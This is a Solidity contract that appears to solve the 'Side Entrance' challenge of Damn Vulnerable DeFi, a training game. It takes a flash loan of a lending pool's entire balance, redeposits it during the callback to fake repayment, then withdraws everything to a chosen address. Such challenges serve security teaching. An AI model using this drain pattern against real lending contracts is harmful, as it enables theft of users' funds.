// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Recover is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function recover(address payable to) external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}